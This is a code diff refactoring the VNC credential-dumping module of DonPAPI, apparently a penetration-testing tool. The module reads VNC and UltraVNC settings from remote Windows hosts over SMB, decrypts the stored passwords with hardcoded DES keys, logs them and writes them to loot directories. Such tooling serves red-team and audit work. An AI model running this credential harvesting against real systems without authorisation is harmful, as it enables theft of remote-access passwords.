@@ -1,29 +1,30 @@
-from binascii import unhexlify
-import os
 import re
+import codecs
+from os import path
 from typing import Any
-
+from binascii import unhexlify
 from dploot.lib.target import Target
 from dploot.lib.smb import DPLootSMBConnection
 from donpapi.core import DonPAPICore
 from donpapi.lib.logger import DonPAPIAdapter
 from Cryptodome.Cipher import DES
-import codecs
+from donpapi.lib.utils import dump_file_to_loot_directories
 
 
-TAG = "VNC"
-
-class VNCDump:
+class VNC:
     vnc_decryption_key = b"\x17\x52\x6b\x06\x23\x4e\x58\x07"
     ultravnc_decryption_key = b'\xe8\x4a\xd6\x60\xc4\x72\x1a\xe0'
 
-    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
+    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
+        self.tag = self.__class__.__name__
         self.target = target
         self.conn = conn
         self.masterkeys = masterkeys
         self.options = options
         self.logger = logger
         self.context = context
+        self.false_positive = false_positive
+        self.max_filesize = max_filesize
 
     def run(self):
         self.logger.display("Dumping VNC Credentials")
@@ -50,7 +51,7 @@ class VNCDump:
                 continue
             value = value[-1].rstrip(b"\x00")
             password = self.recover_vncpassword(value)
-            self.logger.secret(f"[{vnc_name}] Password: {password.decode('latin-1')}",TAG.upper())
+            self.logger.secret(f"[{vnc_name}] Password: {password.decode('latin-1')}",self.tag.upper())
             self.add_to_db(password.decode('latin-1'), vnc_type=vnc_name)
 
     def split_len(self, seq, length):
@@ -99,20 +100,20 @@ class VNCDump:
         for vnc_name, file in vncs:
             file_content = self.conn.readFile(self.context.share, file)
             if file_content is not None:
-                local_filepath = os.path.join(self.context.output_dir, *(file.split('\\')))
-                os.makedirs(os.path.dirname(local_filepath), exist_ok=True)
-                with open(local_filepath,'wb') as f:
-                    if file_content is None:
-                        file_content = b""
-                    f.write(file_content)
+                absolute_local_filepath = path.join(self.context.target_output_dir, *(file.split('\\')))
+                dump_file_to_loot_directories(absolute_local_filepath, file_content)
+                
+                collector_dir_local_filepath = path.join(self.context.global_output_dir, self.tag, file.replace("\\", "_"))
+                dump_file_to_loot_directories(collector_dir_local_filepath, file_content)
+
                 regex_passwd = [rb'passwd=[0-9A-F]+', rb'passwd2=[0-9A-F]+']
                 for regex in regex_passwd:                
                     passwds_encrypted = re.findall(regex, file_content)
                     for passwd_encrypted in passwds_encrypted:
                         passwd_encrypted = passwd_encrypted.split(b'=')[-1]
                         password = self.decrypt_password(unhexlify(passwd_encrypted))
-                        self.logger.secret(f"[{vnc_name}] Password: {password.decode('latin-1')}",TAG.upper())
+                        self.logger.secret(f"[{vnc_name}] Password: {password.decode('latin-1')}",self.tag.upper())
                         self.add_to_db(password.decode('latin-1'), vnc_type=vnc_name)
 
     def add_to_db(self, password, vnc_type):
-        self.context.db.add_secret(computer=self.context.host, collector=TAG, program=vnc_type, password=password, windows_user="SYSTEM")
+        self.context.db.add_secret(computer=self.context.host, collector=self.tag, program=vnc_type, password=password, windows_user="SYSTEM")
